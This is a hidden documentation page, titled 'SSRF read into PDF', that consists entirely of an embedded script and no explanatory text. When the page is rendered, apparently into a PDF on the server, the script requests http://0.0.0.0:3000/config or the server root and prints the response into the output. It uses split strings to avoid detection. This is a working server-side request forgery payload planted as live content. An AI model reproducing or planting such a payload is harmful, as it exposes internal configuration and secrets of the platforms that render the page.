---
title: SSRF read into PDF
deprecated: false
hidden: true
metadata:
  robots: index
---
<HTMLBlock>{`
<div id="out" style="font-size:10px;word-break:break-all;white-space:pre-wrap">LOADING</div>
<script>
(function(){
  var R=window['XMLHttp'+'Request'];
  var u='http://'+'0.0.0.0'+':3000/config';
  var x=new R();
  x.open('GET',u,false);
  try{x.send();document.getElementById('out').textContent='CFG:'+x.responseText.slice(0,3000);}
  catch(e){
    var x2=new R();
    x2.open('GET','http://'+'0.0.0.0'+':3000/',false);
    try{x2.send();document.getElementById('out').textContent='ROOT:'+x2.responseText.slice(0,2000);}
    catch(e2){document.getElementById('out').textContent='FAIL:'+e+'/'+e2;}
  }
})()
</script>
`}</HTMLBlock>
